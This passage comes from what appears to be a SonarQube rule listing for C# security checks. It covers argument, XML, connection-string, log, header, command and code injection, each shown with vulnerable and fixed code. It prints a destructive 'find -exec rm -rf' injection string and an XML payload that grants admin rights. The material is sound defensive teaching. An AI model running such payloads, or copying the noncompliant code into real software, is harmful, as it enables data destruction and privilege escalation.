  <li> OS access control </li>
</ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to arguments injection because untrusted data is inserted directly into the arguments of a process call without sanitization.<br>
The application assumes that incoming data always consists of a specific range of characters and ignores that some characters might force the
<code>find</code> command to start a shell.</p>
<p>In this particular case, an attacker may remove files in <code>/some/folder</code> with the following string:</p>
<pre>
'*' -exec rm -rf {} \;
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public void Run(string args)
    {
        Process p             = new Process();
        p.StartInfo.FileName  = "/usr/bin/find";
        p.StartInfo.Arguments = "/some/folder -iname " + args;
        p.Start();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    public void Run(string args)
    {
        Process p            = new Process();
        p.StartInfo.FileName = "/usr/bin/find";
        p.StartInfo.ArgumentList.Add("/some/folder");
        p.StartInfo.ArgumentList.Add("-iname");
        p.StartInfo.ArgumentList.Add(args);
        p.Start();
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>Here <code>ArgumentList</code> takes care of escaping the passed arguments and internally creates a single string given to the operating system
when <code>System.Diagnostics.Process.Start()</code> is called.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6399">
              roslyn.sonaranalyzer.security.cs:S6399
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XML injections occur when an application builds an XML-formatted string from user input without prior validation or sanitation. In such a case, a
tainted user-controlled value can tamper with the XML string content. Especially, unexpected arbitrary elements and attributes can be inserted in the
corresponding XML description.</p>
<p>A malicious injection payload could, for example:</p>
<ul>
  <li> Insert tags into the main XML document. </li>
  <li> Add attributes to an existing XML tag. </li>
  <li> Change the data value inside a tag. </li>
</ul>
<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>
<h3>What is the potential impact?</h3>
<p>The consequences of an XML injection attack on an application vary greatly depending on the application’s logic. It can affect the application
itself or another element if the XML document is used for cross-component data exchange. For this reason, the actual impact can range from benign
information disclosure to critical remote code execution.</p>
<h4>Information disclosure</h4>
<p>An attacker can forge an attack payload that will modify the XML document so that it will become syntactically incorrect. In that case, when the
data is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this
technical error may disclose sensitive business or technical information.</p>
<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>
<h4>Internal requests tampering</h4>
<p>Some applications communicate with backend micro-services APIs using XML-based protocols such as SOAP. When those applications are vulnerable to
XML injections, attackers can tamper with the internal requests' content. This will allow them to change internal requests' parameters or locations
which, in turn, can lead to various consequences like performing unauthorized actions or accessing sensitive data.</p>
<p>For example, altering a user creation request in such a way can lead to a privilege escalation if attackers manage to modify the default account
privilege level.</p>
<h4>Code execution</h4>
<p>An application might build objects based on an XML serialization string. In that case, an attacker that would exploit an XML injection could be
able to alter the serialization string to modify the corresponding object’s properties.</p>
<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can
lead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function: The role of a user is set in an XML file and the default user role is
<code>user</code>.<br> This example code is vulnerable to an XML injection vulnerability because it builds an XML string from user input without prior
sanitation or validation.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
attacker&lt;/username&gt;&lt;role&gt;admin&lt;/role&gt;&lt;/user&gt;
&lt;user&gt;&lt;username&gt;foo
</pre>
<p>By adapting and inserting this string into the <code>username</code> field, an attacker would be able to log in as an admin.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Xml;

public class ExampleController : Controller
{
    public async void Example(string username)
    {
        XmlWriter writer = XmlWriter.Create("data.xml");
        await writer.WriteRawAsync(
            $@"&lt;user&gt;
                &lt;username&gt;{username}&lt;/username&gt; &lt;!-- Noncompliant --&gt;
                &lt;role&gt;user&lt;/role&gt;
            &lt;/user&gt;"
        );
        await writer.DisposeAsync();
    }
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
using System.Xml;

public class ExampleController : Controller
{
    public async void Example(string username)
    {
        XmlDocument doc = new XmlDocument();
        XmlElement user = doc.CreateElement("user");
        doc.AppendChild(user);

        user.InnerXml = $@"
            &lt;username&gt;{username}&lt;/username&gt; &lt;!-- Noncompliant --&gt;
            &lt;role&gt;user&lt;/role&gt;";
        doc.Save("data.xml");
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Xml;
using System.Security;

public class ExampleController : Controller
{
    public async void Example(string username)
    {
        XmlWriter writer = XmlWriter.Create("data.xml");
        await writer.WriteRawAsync(
            $@"&lt;user&gt;
                &lt;username&gt;{SecurityElement.Escape(username)}&lt;/username&gt;
                &lt;role&gt;user&lt;/role&gt;
            &lt;/user&gt;"
        );
        await writer.DisposeAsync();
    }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
using System.Xml;

public class ExampleController : Controller
{
    public async void Example(string username)
    {
        XmlDocument doc = new XmlDocument();
        XmlElement user = doc.CreateElement("user");
        doc.AppendChild(user);

        XmlElement username_element = d.CreateElement("username");
        user.AppendChild(username_element);
        username_element.InnerText = username;

        XmlElement role = d.CreateElement("role");
        user.AppendChild(role);
        role.InnerText = "user";
        doc.Save("data.xml");
    }
}
</pre>
<h3>How does this work?</h3>
<p>In most cases, building XML strings with a direct concatenation of user input is discouraged. While not always possible, a strong pattern-based
validation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>
<h4>Programmatic object building</h4>
<p>In most cases, an application can directly create documents from user input without having to build and parse an XML string. Doing so prevents
injection vulnerabilities as XML document construction libraries and functions will properly escape and check the type of input values.</p>
<p>Sometimes, the application might need to include the user input in a document built from a trusted XML string. In that case, the recommended
solution is to parse the trusted string first and then programmatically modify the resulting document.</p>
<h4>Converting to a harmless type</h4>
<p>When the application allows it, casting user-submitted data to a harmless type can help prevent XML injection vulnerabilities. In particular,
converting user inputs to numeric types is an efficient sanitation mechanism.</p>
<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually
validating or sanitizing complex types can represent a challenge.</p>
<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/91">CWE-91 - XML Injection (aka Blind XPath Injection)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6641">
              roslyn.sonaranalyzer.security.cs:S6641
            </a>
          </td>
          <td>
            <details>
              <p>Database connection strings control how an application connects to a database. They include information such as the location of the database, how
to authenticate with the database, and how the connection should be secured.</p>
<p>The insertion of user-supplied values into a connection string can allow external control of these database connections.</p>
<h2>Why is this an issue?</h2>
<p>Connection strings contain a series of parameters that are structured as key/value pairs, similar to <code>key1=value1;key2=value2</code>.</p>
<p>If an attacker can control values that are inserted into the connection string, they may be able to insert additional parameters. These additional
parameters can override values that were supplied earlier in the connection string.</p>
<h3>What is the potential impact?</h3>
<p>An attacker can use specially-crafted values to change how the database connection is made. These values can add new parameters to the connection
string, or can override parameters that had already been specified.</p>
<h4>Escalation of privilege</h4>
<p>Some database servers allow authentication via an OS user account instead of a username and password. The database connection is authenticated as
the user running the application. When this authentication mode is used, any username or password in the connection string are ignored.</p>
<p>If an attacker can force the use of this authentication mode, the connection will be made as the user that the web application is running under.
This will often be the <code>LocalSystem</code> or <code>NetworkService</code> account on Windows. Such accounts are often given a high level of
privileges on the database server.</p>
<h4>Credential theft</h4>
<p>If an attacker can change the database server in the connection string, they can have the web application connect to a server that they control.
The web application will then authenticate with that server, allowing those credentials to be stolen.</p>
<h4>Bypassing data validation</h4>
<p>Many web applications implicitly trust data that’s stored in the database. The data is validated before it is stored, so no additional validation
is performed when that data is loaded.</p>
<p>If an attacker can change the database server in the connection string, they can have the web application connect to a database server that they
control. Invalid data in this database could be passed to other services or systems, or could be used to trigger other bugs and logic flaws in the web
application.</p>
<h4>Network traffic sniffing</h4>
<p>The connection string can control how the connection to the database server is secured. For example, it can control whether connections to
Microsoft SQL Server use transport layer security (TLS).</p>
<p>If an attacker can disable these network security measures and they have some way to monitor traffic between the web server and the database
server, they will be able to see all information that’s written to and read from the database.</p>
<h2>How to fix it in .NET</h2>
<p>Microsoft’s database connection libraries typically provide a connection string builder class. These classes provide methods and properties that
safely set parameter values.</p>
<p>Connection string builders will only protect you if you use these methods and properties to set parameter values. They will not help if you are
using them to modify a connection string where user-supplied values have already been added.</p>
<p>If no connection string builder is available, user-supplied values must either be validated to ensure that they’re not malicious, or must be
properly quoted so that they cannot interfere with other connection string parameters.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public string ConnectionString { get; set; } = "Server=10.0.0.101;Database=CustomerData";

public SqlConnection ConnectToDatabase(HttpRequest request)
{
    string connectionString = string.Format("{0};User ID={1};Password={2}",
        ConnectionString,
        request.Form["username"],
        request.Form["password"]);

    SqlConnection connection = new SqlConnection();
    connection.ConnectionString = connectionString; // Noncompliant
    connection.Open();
    return connection;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public string ConnectionString { get; set; } = "Server=10.0.0.101;Database=CustomerData";

public SqlConnection ConnectToDatabase(HttpRequest request)
{
    SqlConnectionStringBuilder builder = new SqlConnectionStringBuilder(ConnectionString);
    builder.UserID = request.Form["username"];
    builder.Password = request.Form["password"];

    SqlConnection connection = new SqlConnection();
    connection.ConnectionString = builder.ConnectionString;
    connection.Open();
    return connection;
}
</pre>
<h3>How does this work?</h3>
<p>Connection string builders will ensure that values are correctly sanitized when adding them to the connection string.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Microsoft - <a href="https://learn.microsoft.com/en-us/dotnet/framework/data/adonet/connection-string-syntax">Connection string syntax</a>
  </li>
</ul>
<h3>Conference presentations</h3>
<ul>
  <li> DefCon 18: Alonso Palazon, Connection String Attacks - <a
  href="https://media.defcon.org/DEF%20CON%2018/DEF%20CON%2018%20presentations/DEF%20CON%2018%20-%20Alonso-Palazon-String.pdf">presentation</a>, <a
  href="https://media.defcon.org/DEF%20CON%2018/DEF%20CON%2018%20presentations/DEF%20CON%2018%20-%20Alonso-Palazon-String-wp.pdf">white paper</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/15">CWE-15 - External Control of System or Configuration Setting</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5145">
              roslyn.sonaranalyzer.security.cs:S5145
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>
<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This
frequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log
entries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,
Log4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>
<p>The focus of this rule is newline character replacement.</p>
<h4>Log Forge</h4>
<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious
activities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to
fake application events.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate
the chain of events being recorded.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    private static readonly log4net.ILog _logger = log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);

    [HttpGet]
    public void Log(string data)
    {
        if (data != null)
        {
            _logger.Info("Log: " + data); // Noncompliant
        }
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    private static readonly log4net.ILog _logger = log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);

    [HttpGet]
    public void Log(string data)
    {
        if (data != null)
        {
            data = data.Replace('\n', '_').Replace('\r', '_');
            _logger.Info("Log: " + data);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and
sanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on
the application context and the logged data usage.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5167">
              roslyn.sonaranalyzer.security.cs:S5167
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=csharpsquid%3AS5122&rule_key=csharpsquid%3AS5122'>S5122</a>, <a href='/organizations/sopra-steria/rules?open=csharpsquid%3AS5146&rule_key=csharpsquid%3AS5146'>S5146</a>, <a href='/organizations/sopra-steria/rules?open=csharpsquid%3AS6287&rule_key=csharpsquid%3AS6287'>S6287</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing
headers.</p>
<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In
this case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of
attack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>
<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation
should be based on a whitelist.</p>
<h3>Noncompliant code example</h3>
<pre>
string value = Request.QueryString["value"];
Response.AddHeader("X-Header", value); // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
string value = Request.QueryString["value"];
// Allow only alphanumeric characters
if (value == null || !Regex.IsMatch(value, "^[a-zA-Z0-9]+$"))
{
  throw new Exception("Invalid value");
}
Response.AddHeader("X-Header", value);
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/index.php/HTTP_Response_Splitting">Attack Category - HTTP Response Splitting</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/113">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response
  Splitting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2076">
              roslyn.sonaranalyzer.security.cs:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public void Run(string binary)
    {
        Process p = new Process();
        p.StartInfo.FileName = binary;
        p.Start();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    public void Run(string binary)
    {
        if (binary.Equals("/usr/bin/ls") || binary.Equals("/usr/bin/cat"))
        {
            // only ls and cat commands are authorized
            Process p = new Process();
            p.StartInfo.FileName = binary;
            p.Start();
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>System.Diagnostics.ProcessStartInfo</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul>
  <li> <code>&amp;</code> </li>
  <li> <code>|</code> </li>
  <li> <code>;</code> </li>
  <li> <code>$</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>`</code> </li>
  <li> <code>\</code> </li>
  <li> <code>!</code> </li>
</ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a
href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits">since its version 2.24</a>.</p>
<p>Here, using the <code>ProcessStartInfo</code> structure helps escaping the passed arguments and internally creates a single string given to the
operating system when <code>System.Diagnostics.Process.Start()</code> is called.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5334">
              roslyn.sonaranalyzer.security.cs:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.CodeDom.Compiler;

public class ExampleController : Controller
{
    public void Run(string message)
    {
        const string code = @"
            using System;
            public class MyClass
            {
                public void MyMethod()
                {
                    Console.WriteLine(""" + message + @""");
                }
            }
        ";

        var provider = CodeDomProvider.CreateProvider("CSharp");
        var compilerParameters = new CompilerParameters { ReferencedAssemblies = { "System.dll", "System.Runtime.dll" } };
        var compilerResults = provider.CompileAssemblyFromSource(compilerParameters, code);
        object myInstance = compilerResults.CompiledAssembly.CreateInstance("MyClass");
        myInstance.GetType().GetMethod("MyMethod").Invoke(myInstance, new object[0]);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.CodeDom.Compiler;

public class ExampleController : Controller
{
    public void Run(string message)
    {
        const string code = @"
            using System;
            public class MyClass
            {
                public void MyMethod(string input)
                {
                    Console.WriteLine(input);
                }
            }
        ";

        var provider = CodeDomProvider.CreateProvider("CSharp");
        var compilerParameters = new CompilerParameters { ReferencedAssemblies = { "System.dll", "System.Runtime.dll" } };
        var compilerResults = provider.CompileAssemblyFromSource(compilerParameters, code);
        object myInstance = compilerResults.CompiledAssembly.CreateInstance("MyClass");
        myInstance.GetType().GetMethod("MyMethod").Invoke(myInstance, new object[]{ message }); // Pass message to dynamic method
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion
is to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<p>The compliant code example uses such an approach.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6639">
              roslyn.sonaranalyzer.security.cs:S6639
            </a>
          </td>
          <td>
            <details>
              <p>Memory allocation injections occur when an application computes the size of a piece of memory to be allocated from an untrusted source. In such a
case, an attacker could be able to make the application unwillingly consume an important amount of memory by enforcing a large allocation size.</p>
<h2>Why is this an issue?</h2>
<p>By repeatedly requesting a feature that consumes a lot of memory, attackers can constantly occupy an important part of an application’s hosting
server memory. Depending on the application’s deployment architecture, hosting server resources and attackers' capabilities, this can lead to an
exhaustion of the available server’s memory.</p>
<h3>What is the potential impact?</h3>
<p>A server that faces a memory exhaustion situation can become unstable. The exact impact will depend on how the affected application is deployed and
how well the hosting server configuration is hardened.</p>
